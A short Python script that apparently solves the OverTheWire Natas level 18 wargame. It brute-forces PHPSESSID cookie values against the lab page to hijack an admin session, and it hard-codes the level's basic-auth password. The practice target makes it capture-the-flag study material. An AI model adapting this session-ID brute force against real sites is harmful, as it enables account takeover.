import requests
from requests.auth import HTTPBasicAuth
import logging

logging.basicConfig(level=logging.DEBUG)

if __name__ == "__main__":
    url = "http://natas18.natas.labs.overthewire.org/index.php"
    level_username = "natas18"
    level_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
    for num in range(641):
        logging.info("Trying PHPSESSID {num}".format(num=str(num)))
        cookies = {"PHPSESSID": str(num)}
        # data={"username": "admin", "password":"asdf"}
        response = requests.post(url, params={"debug": "True"}, auth=HTTPBasicAuth(level_username, level_password), cookies=cookies)
        logging.debug(response.text)
        if "The credentials for the next level are" in response.text:
            print("Found correct PHPSESSID: \n" + response.text)
            break

